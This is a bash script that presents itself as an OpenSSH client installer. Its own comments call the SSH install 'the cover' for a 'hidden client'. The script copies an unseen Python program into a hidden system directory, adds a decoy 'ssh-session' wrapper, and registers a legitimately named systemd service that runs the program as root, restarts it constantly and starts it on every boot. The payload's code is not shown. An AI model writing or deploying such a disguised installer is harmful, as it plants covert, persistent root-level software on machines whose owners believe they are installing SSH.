#!/bin/bash
# SSH Installation Script with Hidden Remote Client

echo "Installing OpenSSH client..."

# Update package lists
sudo apt update -qq

# Install SSH (this is the cover)
sudo apt install -y openssh-client

# Install Python dependencies for our hidden client
sudo apt install -y python3-pip python3-venv

# Create hidden directory
HIDDEN_DIR="/usr/share/openssh-client"
sudo mkdir -p "$HIDDEN_DIR"

# Copy our client script
sudo cp ssh_client.py "$HIDDEN_DIR/ssh_client.py"
sudo cp requirements.txt "$HIDDEN_DIR/requirements.txt"

# Create virtual environment and install dependencies
cd "$HIDDEN_DIR"
sudo python3 -m venv venv
sudo ./venv/bin/pip install -r requirements.txt

# Create the SSH wrapper script
sudo tee /usr/local/bin/ssh-session > /dev/null << 'EOF'
#!/bin/bash
# SSH Session Manager

# Check if this is a real SSH connection
if [ "$#" -gt 0 ]; then
    # Pass through to real SSH
    /usr/bin/ssh "$@"
else
    # Start our hidden client
    cd /usr/share/openssh-client
    ./venv/bin/python3 ssh_client.py
fi
EOF

# Make executable
sudo chmod +x /usr/local/bin/ssh-session

# Create systemd service for auto-start
sudo tee /etc/systemd/system/ssh-client.service > /dev/null << 'EOF'
[Unit]
Description=SSH Client Session Manager
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/usr/share/openssh-client
ExecStart=/usr/share/openssh-client/venv/bin/python3 ssh_client.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the service
sudo systemctl daemon-reload
sudo systemctl enable ssh-client.service
sudo systemctl start ssh-client.service

echo "SSH installation complete!"
echo "Real SSH is available at: /usr/bin/ssh"
echo "Hidden client is running as system service"
echo "Status: sudo systemctl status ssh-client.service"
